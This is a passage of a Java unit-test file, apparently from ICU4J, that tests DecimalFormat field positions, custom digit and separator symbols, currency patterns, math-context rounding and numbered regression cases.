10);\n        checkFormatWithField(\"exponent\", formatter, number, numFmtted,\n            NumberFormat.Field.EXPONENT, 10, 12);\n    }\n\n    @Test\n    public void TestMissingFieldPositionsPerCent() {\n        // Check PERCENT\n        DecimalFormat percentFormat = (DecimalFormat) NumberFormat.getPercentInstance(ULocale.US);\n        Number number = new Double(-0.986);\n        String numberFormatted = percentFormat.format(number);\n        checkFormatWithField(\"sign\", percentFormat, number, numberFormatted,\n            NumberFormat.Field.SIGN, 0, 1);\n        checkFormatWithField(\"integer\", percentFormat, number, numberFormatted,\n            NumberFormat.Field.INTEGER, 1, 3);\n        checkFormatWithField(\"percent\", percentFormat, number, numberFormatted,\n            NumberFormat.Field.PERCENT, 3, 4);\n    }\n\n    @Test\n    public void TestMissingFieldPositionsPerCentPattern() {\n        // Check PERCENT with more digits\n        DecimalFormatSymbols us_symbols = new DecimalFormatSymbols(ULocale.US);\n        DecimalFormat fmtPercent = new DecimalFormat(\"0.#####%\", us_symbols);\n        Number number = new Double(-0.986);\n        String numFmtted = fmtPercent.format(number);\n\n        checkFormatWithField(\"sign\", fmtPercent, number, numFmtted,\n            NumberFormat.Field.SIGN, 0, 1);\n        checkFormatWithField(\"integer\", fmtPercent, number, numFmtted,\n            NumberFormat.Field.INTEGER, 1, 3);\n        checkFormatWithField(\"decimal separator\", fmtPercent, number, numFmtted,\n            NumberFormat.Field.DECIMAL_SEPARATOR, 3, 4);\n        checkFormatWithField(\"fraction\", fmtPercent, number, numFmtted,\n            NumberFormat.Field.FRACTION, 4, 5);\n        checkFormatWithField(\"percent\", fmtPercent, number, numFmtted,\n            NumberFormat.Field.PERCENT, 5, 6);\n    }\n\n    @Test\n    public void TestMissingFieldPositionsPerMille() {\n        // Check PERMILLE\n        DecimalFormatSymbols us_symbols = new DecimalFormatSymbols(ULocale.US);\n        DecimalFormat fmtPerMille = new DecimalFormat(\"0.######‰\", us_symbols);\n        Number numberPermille = new Double(-0.98654);\n        String numFmtted = fmtPerMille.format(numberPermille);\n\n        checkFormatWithField(\"sign\", fmtPerMille, numberPermille, numFmtted,\n            NumberFormat.Field.SIGN, 0, 1);\n        checkFormatWithField(\"integer\", fmtPerMille, numberPermille, numFmtted,\n            NumberFormat.Field.INTEGER, 1, 4);\n        checkFormatWithField(\"decimal separator\", fmtPerMille, numberPermille, numFmtted,\n            NumberFormat.Field.DECIMAL_SEPARATOR, 4, 5);\n        checkFormatWithField(\"fraction\", fmtPerMille, numberPermille, numFmtted,\n            NumberFormat.Field.FRACTION, 5, 7);\n        checkFormatWithField(\"permille\", fmtPerMille, numberPermille, numFmtted,\n            NumberFormat.Field.PERMILLE, 7, 8);\n    }\n\n    @Test\n    public void TestMissingFieldPositionsNegativeBigInt() {\n      DecimalFormatSymbols us_symbols = new DecimalFormatSymbols(ULocale.US);\n        DecimalFormat formatter = new DecimalFormat(\"0.#####E+0\", us_symbols);\n        Number number = new BigDecimal(\"-123456789987654321\");\n        String bigDecFmtted = formatter.format(number);\n\n        checkFormatWithField(\"sign\", formatter, number, bigDecFmtted,\n            NumberFormat.Field.SIGN, 0, 1);\n        checkFormatWithField(\"integer\", formatter, number, bigDecFmtted,\n            NumberFormat.Field.INTEGER, 1, 2);\n        checkFormatWithField(\"decimal separator\", formatter, number, bigDecFmtted,\n            NumberFormat.Field.DECIMAL_SEPARATOR, 2, 3);\n        checkFormatWithField(\"exponent symbol\", formatter, number, bigDecFmtted,\n            NumberFormat.Field.EXPONENT_SYMBOL, 8, 9);\n        checkFormatWithField(\"exponent sign\", formatter, number, bigDecFmtted,\n            NumberFormat.Field.EXPONENT_SIGN, 9, 10);\n        checkFormatWithField(\"exponent\", formatter, number, bigDecFmtted,\n            NumberFormat.Field.EXPONENT, 10, 12);\n    }\n\n    @Test\n    public void TestMissingFieldPositionsNegativeLong() {\n        Number number = new Long(\"-123456789987654321\");\n        DecimalFormatSymbols us_symbols = new DecimalFormatSymbols(ULocale.US);\n        DecimalFormat formatter = new DecimalFormat(\"0.#####E+0\", us_symbols);\n        String longFmtted = formatter.format(number);\n\n        checkFormatWithField(\"sign\", formatter, number, longFmtted,\n            NumberFormat.Field.SIGN, 0, 1);\n        checkFormatWithField(\"integer\", formatter, number, longFmtted,\n            NumberFormat.Field.INTEGER, 1, 2);\n        checkFormatWithField(\"decimal separator\", formatter, number, longFmtted,\n            NumberFormat.Field.DECIMAL_SEPARATOR, 2, 3);\n        checkFormatWithField(\"exponent symbol\", formatter, number, longFmtted,\n            NumberFormat.Field.EXPONENT_SYMBOL, 8, 9);\n        checkFormatWithField(\"exponent sign\", formatter, number, longFmtted,\n            NumberFormat.Field.EXPONENT_SIGN, 9, 10);\n        checkFormatWithField(\"exponent\", formatter, number, longFmtted,\n            NumberFormat.Field.EXPONENT, 10, 12);\n    }\n\n    @Test\n    public void TestMissingFieldPositionsPositiveBigDec() {\n        // Check complex positive;negative pattern.\n        DecimalFormatSymbols us_symbols = new DecimalFormatSymbols(ULocale.US);\n        DecimalFormat fmtPosNegSign = new DecimalFormat(\"+0.####E+00;-0.#######E+0\", us_symbols);\n        Number positiveExp = new Double(\"9876543210\");\n        String posExpFormatted = fmtPosNegSign.format(positiveExp);\n\n        checkFormatWithField(\"sign\", fmtPosNegSign, positiveExp, posExpFormatted,\n            NumberFormat.Field.SIGN, 0, 1);\n        checkFormatWithField(\"integer\", fmtPosNegSign, positiveExp, posExpFormatted,\n            NumberFormat.Field.INTEGER, 1, 2);\n        checkFormatWithField(\"decimal separator\", fmtPosNegSign, positiveExp, posExpFormatted,\n            NumberFormat.Field.DECIMAL_SEPARATOR, 2, 3);\n        checkFormatWithField(\"fraction\", fmtPosNegSign, positiveExp, posExpFormatted,\n            NumberFormat.Field.FRACTION, 3, 7);\n        checkFormatWithField(\"exponent symbol\", fmtPosNegSign, positiveExp, posExpFormatted,\n            NumberFormat.Field.EXPONENT_SYMBOL, 7, 8);\n        checkFormatWithField(\"exponent sign\", fmtPosNegSign, positiveExp, posExpFormatted,\n            NumberFormat.Field.EXPONENT_SIGN, 8, 9);\n        checkFormatWithField(\"exponent\", fmtPosNegSign, positiveExp, posExpFormatted,\n            NumberFormat.Field.EXPONENT, 9, 11);\n    }\n\n    @Test\n    public void TestMissingFieldPositionsNegativeBigDec() {\n        // Check complex positive;negative pattern.\n      DecimalFormatSymbols us_symbols = new DecimalFormatSymbols(ULocale.US);\n        DecimalFormat fmtPosNegSign = new DecimalFormat(\"+0.####E+00;-0.#######E+0\", us_symbols);\n        Number negativeExp = new BigDecimal(\"-0.000000987654321083\");\n        String negExpFormatted = fmtPosNegSign.format(negativeExp);\n\n        checkFormatWithField(\"sign\", fmtPosNegSign, negativeExp, negExpFormatted,\n            NumberFormat.Field.SIGN, 0, 1);\n        checkFormatWithField(\"integer\", fmtPosNegSign, negativeExp, negExpFormatted,\n            NumberFormat.Field.INTEGER, 1, 2);\n        checkFormatWithField(\"decimal separator\", fmtPosNegSign, negativeExp, negExpFormatted,\n            NumberFormat.Field.DECIMAL_SEPARATOR, 2, 3);\n        checkFormatWithField(\"fraction\", fmtPosNegSign, negativeExp, negExpFormatted,\n            NumberFormat.Field.FRACTION, 3, 7);\n        checkFormatWithField(\"exponent symbol\", fmtPosNegSign, negativeExp, negExpFormatted,\n            NumberFormat.Field.EXPONENT_SYMBOL, 7, 8);\n        checkFormatWithField(\"exponent sign\", fmtPosNegSign, negativeExp, negExpFormatted,\n            NumberFormat.Field.EXPONENT_SIGN, 8, 9);\n        checkFormatWithField(\"exponent\", fmtPosNegSign, negativeExp, negExpFormatted,\n            NumberFormat.Field.EXPONENT, 9, 11);\n    }\n\n    @Test\n    public void TestStringSymbols() {\n        DecimalFormatSymbols symbols = new DecimalFormatSymbols(ULocale.US);\n\n        // Attempt digits with multiple code points.\n        String[] customDigits = {\"(0)\", \"(1)\", \"(2)\", \"(3)\", \"(4)\", \"(5)\", \"(6)\", \"(7)\", \"(8)\", \"(9)\"};\n        symbols.setDigitStrings(customDigits);\n        DecimalFormat fmt = new DecimalFormat(\"#,##0.0#\", symbols);\n        expect2(fmt, 1234567.89, \"(1),(2)(3)(4),(5)(6)(7).(8)(9)\");\n\n        // Scientific notation should work.\n        fmt.applyPattern(\"@@@E0\");\n        expect2(fmt, 1230000, \"(1).(2)(3)E(6)\");\n\n        // Grouping and decimal with multiple code points (supported in parsing since ICU 61)\n        symbols.setDecimalSeparatorString(\"~~\");\n        symbols.setGroupingSeparatorString(\"^^\");\n        fmt.setDecimalFormatSymbols(symbols);\n        fmt.applyPattern(\"#,##0.0#\");\n        expect2(fmt, 1234567.89, \"(1)^^(2)(3)(4)^^(5)(6)(7)~~(8)(9)\");\n\n        // Digits starting at U+1D7CE MATHEMATICAL BOLD DIGIT ZERO\n        // These are all single code points, so parsing will work.\n        for (int i=0; i<10; i++) customDigits[i] = new String(Character.toChars(0x1D7CE+i));\n        symbols.setDigitStrings(customDigits);\n        symbols.setDecimalSeparatorString(\"😁\");\n        symbols.setGroupingSeparatorString(\"😎\");\n        fmt.setDecimalFormatSymbols(symbols);\n        expect2(fmt, 1234.56, \"𝟏😎𝟐𝟑𝟒😁𝟓𝟔\");\n    }\n\n    @Test\n    public void TestArabicCurrencyPatternInfo() {\n        ULocale arLocale = new ULocale(\"ar\");\n\n        DecimalFormatSymbols symbols = new DecimalFormatSymbols(arLocale);\n        String currSpacingPatn = symbols.getPatternForCurrencySpacing(DecimalFormatSymbols.CURRENCY_SPC_CURRENCY_MATCH, true);\n        if (currSpacingPatn==null || currSpacingPatn.length() == 0) {\n            errln(\"locale ar, getPatternForCurrencySpacing returns null or 0-length string\");\n        }\n\n        DecimalFormat currAcctFormat = (DecimalFormat)NumberFormat.getInstance(arLocale, NumberFormat.ACCOUNTINGCURRENCYSTYLE);\n        String currAcctPatn = currAcctFormat.toPattern();\n        if (currAcctPatn==null || currAcctPatn.length() == 0) {\n            errln(\"locale ar, toPattern for ACCOUNTINGCURRENCYSTYLE returns null or 0-length string\");\n        }\n    }\n\n    @Test\n    public void TestMinMaxOverrides()\n            throws IllegalAccessException, IllegalArgumentException, InvocationTargetException,\n                NoSuchMethodException, SecurityException {\n        Class<?>[] baseClasses = {NumberFormat.class, NumberFormat.class, DecimalFormat.class};\n        String[] names = {\"Integer\", \"Fraction\", \"Significant\"};\n        for (int i = 0; i < 3; i++) {\n            DecimalFormat df = new DecimalFormat();\n            Class<?> base = baseClasses[i];\n            String name = names[i];\n            Method getMinimum = base.getDeclaredMethod(\"getMinimum\" + name + \"Digits\");\n            Method setMinimum = base.getDeclaredMethod(\"setMinimum\" + name + \"Digits\", Integer.TYPE);\n            Method getMaximum = base.getDeclaredMethod(\"getMaximum\" + name + \"Digits\");\n            Method setMaximum = base.getDeclaredMethod(\"setMaximum\" + name + \"Digits\", Integer.TYPE);\n\n            // Check max overrides min\n            setMinimum.invoke(df, 2);\n            assertEquals(name + \" getMin A\", 2, getMinimum.invoke(df));\n            setMaximum.invoke(df, 3);\n            assertEquals(name + \" getMin B\", 2, getMinimum.invoke(df));\n            assertEquals(name + \" getMax B\", 3, getMaximum.invoke(df));\n            setMaximum.invoke(df, 2);\n            assertEquals(name + \" getMin C\", 2, getMinimum.invoke(df));\n            assertEquals(name + \" getMax C\", 2, getMaximum.invoke(df));\n            setMaximum.invoke(df, 1);\n            assertEquals(name + \" getMin D\", 1, getMinimum.invoke(df));\n            assertEquals(name + \" getMax D\", 1, getMaximum.invoke(df));\n\n            // Check min overrides max\n            setMaximum.invoke(df, 2);\n            assertEquals(name + \" getMax E\", 2, getMaximum.invoke(df));\n            setMinimum.invoke(df, 1);\n            assertEquals(name + \" getMin F\", 1, getMinimum.invoke(df));\n            assertEquals(name + \" getMax F\", 2, getMaximum.invoke(df));\n            setMinimum.invoke(df, 2);\n            assertEquals(name + \" getMin G\", 2, getMinimum.invoke(df));\n            assertEquals(name + \" getMax G\", 2, getMaximum.invoke(df));\n            setMinimum.invoke(df, 3);\n            assertEquals(name + \" getMin H\", 3, getMinimum.invoke(df));\n            assertEquals(name + \" getMax H\", 3, getMaximum.invoke(df));\n        }\n    }\n\n    @Test\n    public void TestSetMathContext() throws ParseException {\n        java.math.MathContext fourDigits = new java.math.MathContext(4);\n        java.math.MathContext unlimitedCeiling = new java.math.MathContext(0, RoundingMode.CEILING);\n\n        // Test rounding\n        DecimalFormat df = new DecimalFormat();\n        assertEquals(\"Default format\", \"9,876.543\", df.format(9876.5432));\n        df.setMathContext(fourDigits);\n        assertEquals(\"Format with fourDigits\", \"9,877\", df.format(9876.5432));\n        df.setMathContext(unlimitedCeiling);\n        assertEquals(\"Format with unlimitedCeiling\", \"9,876.544\", df.format(9876.5432));\n\n        // Test multiplication\n        df = new DecimalFormat(\"0.000%\");\n        assertEquals(\"Default multiplication\", \"12.001%\", df.format(0.120011));\n        df.setMathContext(fourDigits);\n        assertEquals(\"Multiplication with fourDigits\", \"12.000%\", df.format(0.120011));\n        df.setMathContext(unlimitedCeiling);\n        assertEquals(\"Multiplication with unlimitedCeiling\", \"12.002%\", df.format(0.120011));\n\n        // Test simple division\n        df = new DecimalFormat(\"0%\");\n        assertEquals(\"Default division\", 0.12001, df.parse(\"12.001%\").doubleValue());\n        df.setMathContext(fourDigits);\n        // NOTE: Since ICU 61, division no longer occurs with percentage parsing.\n        // assertEquals(\"Division with fourDigits\", 0.12, df.parse(\"12.001%\").doubleValue());\n        assertEquals(\"Division with fourDigits\", 0.12001, df.parse(\"12.001%\").doubleValue());\n        df.setMathContext(unlimitedCeiling);\n        assertEquals(\"Division with unlimitedCeiling\", 0.12001, df.parse(\"12.001%\").doubleValue());\n\n        // Test extreme division\n        df = new DecimalFormat();\n        df.setMultiplier(1000000007); // prime number\n        String hugeNumberString = \"9876543212345678987654321234567898765432123456789\"; // 49 digits\n        BigInteger huge34Digits = new BigInteger(\"9876543143209876985185182338271622000000\");\n        BigInteger huge4Digits = new BigInteger(\"9877000000000000000000000000000000000000\");\n        BigInteger actual34Digits = ((BigDecimal) df.parse(hugeNumberString)).toBigIntegerExact();\n        assertEquals(\"Default extreme division\", huge34Digits, actual34Digits);\n        df.setMathContext(fourDigits);\n        BigInteger actual4Digits = ((BigDecimal) df.parse(hugeNumberString)).toBigIntegerExact();\n        assertEquals(\"Extreme division with fourDigits\", huge4Digits, actual4Digits);\n    }\n\n    /**\n     * ArithmeticException is thrown when inverting multiplier produces a non-terminating\n     * decimal result in conjunction with MathContext of unlimited precision.\n     */\n    @Test\n    public void testSetMathContextArithmeticException() {\n        DecimalFormat df = new DecimalFormat();\n        df.setMultiplier(7);\n        try {\n            df.setMathContext(java.math.MathContext.UNLIMITED);\n            fail(\"Extreme division with unlimited precision should throw ArithmeticException\");\n        } catch (ArithmeticException e) {\n            // expected\n        }\n    }\n\n    /**\n     * ArithmeticException is thrown when inverting multiplier produces a non-terminating\n     * decimal result in conjunction with MathContext of unlimited precision.\n     */\n    @Test\n    public void testSetMathContextICUArithmeticException() {\n        DecimalFormat df = new DecimalFormat();\n        df.setMultiplier(7);\n        try {\n            df.setMathContextICU(new MathContext(0));\n            fail(\"Extreme division with unlimited precision should throw ArithmeticException\");\n        } catch (ArithmeticException e) {\n            // expected\n        }\n    }\n\n    /**\n     * ArithmeticException is thrown when inverting multiplier produces a non-terminating\n     * decimal result in conjunction with MathContext of unlimited precision.\n     */\n    @Test\n    public void testSetMultiplierArithmeticException() {\n        DecimalFormat df = new DecimalFormat();\n        df.setMathContext(java.math.MathContext.UNLIMITED);\n        try {\n            df.setMultiplier(7);\n            fail(\"Extreme division with unlimited precision should throw ArithmeticException\");\n        } catch (ArithmeticException e) {\n            // expected\n        }\n    }\n\n    @Test\n    public void Test10436() {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getInstance(Locale.ENGLISH);\n        df.setRoundingMode(MathContext.ROUND_CEILING);\n        df.setMinimumFractionDigits(0);\n        df.setMaximumFractionDigits(0);\n        assertEquals(\"-.99 should round toward infinity\", \"-0\", df.format(-0.99));\n    }\n\n    @Test\n    public void Test10765() {\n        NumberFormat fmt = NumberFormat.getInstance(new ULocale(\"en\"));\n        fmt.setMinimumIntegerDigits(10);\n        FieldPosition pos = new FieldPosition(NumberFormat.Field.GROUPING_SEPARATOR);\n        StringBuffer sb = new StringBuffer();\n        fmt.format(1234567, sb, pos);\n        assertEquals(\"Should have multiple grouping separators\", \"0,001,234,567\", sb.toString());\n        assertEquals(\"FieldPosition should report the first occurence\", 1, pos.getBeginIndex());\n        assertEquals(\"FieldPosition should report the first occurence\", 2, pos.getEndIndex());\n    }\n\n    @Test\n    public void Test10997() {\n        NumberFormat fmt = NumberFormat.getCurrencyInstance(new ULocale(\"en-US\"));\n        fmt.setMinimumFractionDigits(4);\n        fmt.setMaximumFractionDigits(4);\n        String str1 = fmt.format(new CurrencyAmount(123.45, Currency.getInstance(\"USD\")));\n        String str2 = fmt.format(new CurrencyAmount(123.45, Currency.getInstance(\"EUR\")));\n        assertEquals(\"minFrac 4 should be respected in default currency\", \"$123.4500\", str1);\n        assertEquals(\"minFrac 4 should be respected in different currency\", \"€123.4500\", str2);\n    }\n\n    @Test\n    public void Test11020() {\n        DecimalFormatSymbols sym = new DecimalFormatSymbols(ULocale.FRANCE);\n        DecimalFormat fmt = new DecimalFormat(\"0.05E0\", sym);\n        String result = fmt.format(12301.2).replace('\\u00a0', ' ');\n        assertEquals(\"Rounding increment should be applied after magnitude scaling\", \"1,25E4\", result);\n    }\n\n    @Test\n    public void Test11025() {\n        String pattern = \"¤¤ **####0.00\";\n        DecimalFormatSymbols sym = new DecimalFormatSymbols(ULocale.FRANCE);\n        DecimalFormat fmt = new DecimalFormat(pattern, sym);\n        String result = fmt.format(433.0);\n        assertEquals(\"Number should be padded to 11 characters\", \"EUR *433,00\", result);\n    }\n\n    @Test\n    public void Test11640_TripleCurrencySymbol() {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getInstance();\n        df.applyPattern(\"¤¤¤ 0\");\n        String result = df.getPositivePrefix();\n        assertEquals(\"Triple-currency should give long name on getPositivePrefix\", \"US dollars \", result);\n    }\n\n    @Test\n    public void Test11645() {\n        String pattern = \"#,##0.0#\";\n        DecimalFormat fmt = (DecimalFormat) NumberFormat.getInstance();\n        fmt.applyPattern(pattern);\n        DecimalFormat fmtCopy;\n\n        final int newMultiplier = 37;\n        fmtCopy = (DecimalFormat) fmt.clone();\n        assertNotEquals(\"Value before setter\", fmtCopy.getMultiplier(), newMultiplier);\n        fmtCopy.setMultiplier(newMultiplier);\n        assertEquals(\"Value after setter\", fmtCopy.getMultiplier(), newMultiplier);\n        fmtCopy.applyPattern(pattern);\n        assertEquals(\"Value after applyPattern\", fmtCopy.getMultiplier(), newMultiplier);\n        assertFalse(\"multiplier\", fmt.equals(fmtCopy));\n\n        final int newRoundingMode = RoundingMode.CEILING.ordinal();\n        fmtCopy = (DecimalFormat) fmt.clone();\n        assertNotEquals(\"Value before setter\", fmtCopy.getRoundingMode(), newRoundingMode);\n        fmtCopy.setRoundingMode(newRoundingMode);\n        assertEquals(\"Value after setter\", fmtCopy.getRoundingMode(), newRoundingMode);\n        fmtCopy.applyPattern(pattern);\n        assertEquals(\"Value after applyPattern\", fmtCopy.getRoundingMode(), newRoundingMode);\n        assertFalse(\"roundingMode\", fmt.equals(fmtCopy));\n\n        final Currency newCurrency = Currency.getInstance(\"EAT\");\n        fmtCopy = (DecimalFormat) fmt.clone();\n        assertNotEquals(\"Value before setter\", fmtCopy.getCurrency(), newCurrency);\n        fmtCopy.setCurrency(newCurrency);\n        assertEquals(\"Value after setter\", fmtCopy.getCurrency(), newCurrency);\n        fmtCopy.applyPattern(pattern);\n        assertEquals(\"Value after applyPattern\", fmtCopy.getCurrency(), newCurrency);\n        assertFalse(\"currency\", fmt.equals(fmtCopy));\n\n        final CurrencyUsage newCurrencyUsage = CurrencyUsage.CASH;\n        fmtCopy = (DecimalFormat) fmt.clone();\n        assertNotEquals(\"Value before setter\", fmtCopy.getCurrencyUsage(), newCurrencyUsage);\n        fmtCopy.setCurrencyUsage(CurrencyUsage.CASH);\n        assertEquals(\"Value after setter\", fmtCopy.getCurrencyUsage(), newCurrencyUsage);\n        fmtCopy.applyPattern(pattern);\n        assertEquals(\"Value after applyPattern\", fmtCopy.getCurrencyUsage(), newCurrencyUsage);\n        assertFalse(\"currencyUsage\", fmt.equals(fmtCopy));\n    }\n\n    @Test\n    public void Test11646() {\n        DecimalFormatSymbols symbols = new DecimalFormatSymbols(new ULocale(\"en_US\"));\n        String pattern = \"\\u00a4\\u00a4\\u00a4 0.00 %\\u00a4\\u00a4\";\n        DecimalFormat fmt = new DecimalFormat(pattern, symbols);\n\n        // Test equality with affixes. set affix methods can't capture special\n        // characters which is why equality should fail.\n        {\n          DecimalFormat fmtCopy = (DecimalFormat) fmt.clone();\n          assertEquals(\"\", fmt, fmtCopy);\n          fmtCopy.setPositivePrefix(fmtCopy.getPositivePrefix());\n          assertNotEquals(\"\", fmt, fmtCopy);\n        }\n        {\n          DecimalFormat fmtCopy = (DecimalFormat) fmt.clone();\n          assertEquals(\"\", fmt, fmtCopy);\n          fmtCopy.setPositiveSuffix(fmtCopy.getPositiveSuffix());\n          assertNotEquals(\"\", fmt, fmtCopy);\n        }\n        {\n          DecimalFormat fmtCopy = (DecimalFormat) fmt.clone();\n          assertEquals(\"\", fmt, fmtCopy);\n          fmtCopy.setNegativePrefix(fmtCopy.getNegativePrefix());\n          assertNotEquals(\"\", fmt, fmtCopy);\n        }\n        {\n          DecimalFormat fmtCopy = (DecimalFormat) fmt.clone();\n          assertEquals(\"\", fmt, fmtCopy);\n          fmtCopy.setNegativeSuffix(fmtCopy.getNegativeSuffix());\n          assertNotEquals(\"\", fmt, fmtCopy);\n        }\n    }\n\n    @Test\n    public void Test11648() {\n        DecimalFormat df = new DecimalFormat(\"0.00\");\n        df.setScientificNotation(true);\n        String pat = df.toPattern();\n        assertEquals(\"A valid scientific notation pattern should be produced\", \"0.00E0\", pat);\n    }\n\n    @Test\n    public void Test11649() {\n        String pattern = \"\\u00a4\\u00a4\\u00a4 0.00\";\n        DecimalFormat fmt = new DecimalFormat(pattern);\n        fmt.setCurrency(Currency.getInstance(\"USD\"));\n        assertEquals(\"Triple currency sign should format long name\", \"US dollars 12.34\", fmt.format(12.34));\n\n        String newPattern = fmt.toPattern();\n        assertEquals(\"Should produce a valid pattern\", pattern, newPattern);\n\n        DecimalFormat fmt2 = new DecimalFormat(newPattern);\n        fmt2.setCurrency(Currency.getInstance(\"USD\"));\n        assertEquals(\"Triple currency sign pattern should round-trip\", \"US dollars 12.34\", fmt2.format(12.34));\n\n        String quotedPattern = \"\\u00a4\\u00a4'\\u00a4' 0.00\";\n        DecimalFormat fmt3 = new DecimalFormat(quotedPattern);\n        assertEquals(\"Should be treated as double currency sign\", \"USD\\u00a4 12.34\", fmt3.format(12.34));\n\n        String outQuotedPattern = fmt3.toPattern();\n        assertEquals(\"Double currency sign with quoted sign should round-trip\", quotedPattern, outQuotedPattern);\n    }\n\n    @Test\n    @Ignore\n    public void Test11686() {\n        // Only passes with slow mode.\n        // TODO: Re-enable this test with slow mode.\n        DecimalFormat df = new DecimalFormat();\n        df.setPositiveSuffix(\"0K\");\n        df.setNegativeSuffix(\"0N\");\n        expect2(df, 123, \"1230K\");\n        expect2(df, -123, \"-1230N\");\n    }\n\n    @Test\n    public void Test11839() {\n        DecimalFormatSymbols dfs = new DecimalFormatSymbols(ULocale.ENGLISH);\n        dfs.setMinusSignString(\"a∸\");\n        dfs.setPlusSignString(\"b∔\"); //  ∔  U+2214 DOT PLUS\n        DecimalFormat df = new DecimalFormat(\"0.00+;0.00-\", dfs);\n        String result = df.format(-1.234);\n        assertEquals(\"Locale-specific minus sign should be used\", \"1.23a∸\", result);\n        result = df.format(1.234);\n        assertEquals(\"Locale-specific plus sign should be used\", \"1.23b∔\", result);\n        // Test round-trip with parse\n        expect2(df, -456, \"456.00a∸\");\n        expect2(df, 456, \"456.00b∔\");\n    }\n\n    @Test\n    public void Test12753() {\n        ULocale locale = new ULocale(\"en-US\");\n        DecimalFormatSymbols symbols = DecimalFormatSymbols.getInstance(locale);\n        symbols.setDecimalSeparator('*');\n        DecimalFormat df = new DecimalFormat(\"0.00\", symbols);\n        df.setDecimalPatternMatchRequired(true);\n        try {\n            df.parse(\"123\");\n            fail(\"Parsing integer succeeded even though setDecimalPatternMatchRequired was set\");\n        } catch (ParseException e) {\n            // Parse failed (expected)\n        }\n    }\n\n    @Test\n    public void Test12962() {\n        String pat = \"**0.00\";\n        DecimalFormat df = new DecimalFormat(pat);\n        String newPat = df.toPattern();\n        assertEquals(\"Format width changed upon calling applyPattern\", pat.length(), newPat.length());\n    }\n\n    @Test\n    public void Test10354() {\n        DecimalFormatSymbols dfs = new DecimalFormatSymbols();\n        dfs.setNaN(\"\");\n        DecimalFormat df = new DecimalFormat();\n        df.setDecimalFormatSymbols(dfs);\n        try {\n            df.formatToCharacterIterator(Double.NaN);\n            // pass\n        } catch (IllegalArgumentException e) {\n            throw new AssertionError(e);\n        }\n    }\n\n    @Test\n    public void Test11913() {\n        NumberFormat df = DecimalFormat.getInstance();\n        String result = df.format(new BigDecimal(\"1.23456789E400\"));\n        assertEquals(\"Should format more than 309 digits\", \"12,345,678\", result.substring(0, 10));\n        assertEquals(\"Should format more than 309 digits\", 534, result.length());\n    }\n\n    @Test\n    public void Test12045() {\n        if (logKnownIssue(\"12045\", \"XSU is missing from fr\")) { return; }\n\n        NumberFormat nf = NumberFormat.getInstance(new ULocale(\"fr\"), NumberFormat.PLURALCURRENCYSTYLE);\n        ParsePosition ppos = new ParsePosition(0);\n        try {\n            CurrencyAmount result = nf.parseCurrency(\"2,34 XSU\", ppos);\n            assertEquals(\"Parsing should succeed on XSU\",\n                         new CurrencyAmount(2.34, Currency.getInstance(\"XSU\")), result);\n            // pass\n        } catch (Exception e) {\n            //throw new AssertionError(\"Should have been able to parse XSU\", e);\n            throw new AssertionError(\"Should have been able to parse XSU: \" + e.getMessage());\n        }\n    }\n\n    @Test\n    public void Test11739() {\n        NumberFormat nf = NumberFormat.getCurrencyInstance(new ULocale(\"sr_BA\"));\n        ((DecimalFormat) nf).applyPattern(\"#,##0.0 ¤¤¤\");\n        ParsePosition ppos = new ParsePosition(0);\n        CurrencyAmount result = nf.parseCurrency(\"1.500 амерички долар\", ppos);\n        assertEquals(\"Should parse to 1500 USD\", new CurrencyAmount(1500, Currency.getInstance(\"USD\")), result);\n    }\n\n    @Test\n    public void Test11647() {\n        DecimalFormat df = new DecimalFormat();\n        df.applyPattern(\"¤¤¤¤#\");\n        String actual = df.format(123);\n        assertEquals(\"Should replace 4 currency signs with U+FFFD\", \"\\uFFFD123\", actual);\n    }\n\n    @Test\n    public void Test12567() {\n        DecimalFormat df1 = (DecimalFormat) NumberFormat.getInstance(NumberFormat.PLURALCURRENCYSTYLE);\n        DecimalFormat df2 = (DecimalFormat) NumberFormat.getInstance(NumberFormat.NUMBERSTYLE);\n        df2.setCurrency(df1.getCurrency());\n        df2.setCurrencyPluralInfo(df1.getCurrencyPluralInfo());\n        df1.applyPattern(\"0.00\");\n        df2.applyPattern(\"0.00\");\n        assertEquals(\"df1 == df2\", df1, df2);\n        assertEquals(\"df2 == df1\", df2, df1);\n        df2.setPositivePrefix(\"abc\");\n        assertNotEquals(\"df1 != df2\", df1, df2);\n        assertNotEquals(\"df2 != df1\", df2, df1);\n    }\n\n    @Test\n    public void Test11897_LocalizedPatternSeparator() {\n        // In a locale with a different <list> symbol, like arabic,\n        // kPatternSeparatorSymbol should still be ';'\n        {\n            DecimalFormatSymbols dfs = new DecimalFormatSymbols(new ULocale(\"ar\"));\n            assertEquals(\"pattern separator symbol should be ;\",\n                    ';',\n                    dfs.getPatternSeparator());\n        }\n\n        // However, the custom symbol should be used in localized notation\n        // when set manually via API\n        {\n            DecimalFormatSymbols dfs = new DecimalFormatSymbols(new ULocale(\"en\"));\n            dfs.setPatternSeparator('!');\n            DecimalFormat df = new DecimalFormat(\"0\", dfs);\n            df.applyPattern(\"a0;b0\"); // should not throw\n            assertEquals(\"should apply the normal pattern\",\n                    df.getNegativePrefix(),\n                    \"b\");\n            df.applyLocalizedPattern(\"c0!d0\"); // should not throw\n            assertEquals(\"should apply the localized pattern\",\n                    df.getNegativePrefix(),\n                    \"d\");\n        }\n    }\n\n    @Test\n    public void Test13055() {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getPercentInstance();\n        df.setMaximumFractionDigits(0);\n        df.setRoundingMode(BigDecimal.ROUND_HALF_EVEN);\n        assertEquals(\"Should round percent toward even number\", \"216%\", df.format(2.155));\n    }\n\n    @Test\n    public void Test13056() {\n        DecimalFormat df = new DecimalFormat(\"#,##0\");\n        assertEquals(\"Primary grouping should return 3\", 3, df.getGroupingSize());\n        assertEquals(\"Secondary grouping should return 0\", 0, df.getSecondaryGroupingSize());\n        df.setSecondaryGroupingSize(3);\n        assertEquals(\"Primary grouping should still return 3\", 3, df.getGroupingSize());\n        assertEquals(\"Secondary grouping should round-trip\", 3, df.getSecondaryGroupingSize());\n        df.setGroupingSize(4);\n        assertEquals(\"Primary grouping should return 4\", 4, df.getGroupingSize());\n        assertEquals(\"Secondary should remember explicit setting and return 3\", 3, df.getSecondaryGroupingSize());\n    }\n\n    @Test\n    public void Test13074() {\n        DecimalFormat df = (DecimalFormat) NumberFormat.getCurrencyInstance(new ULocale(\"bg-BG\"));\n        String result = df.format(987654.321);\n        assertEquals(\"Locale 'bg' should not use monetary grouping\", \"987654,32 лв.\", result);\n    }\n\n    @Test\n    public void Test13088and13162() {\n        ULocale loc = new ULocale(\"fa\");\n        String pattern1 = 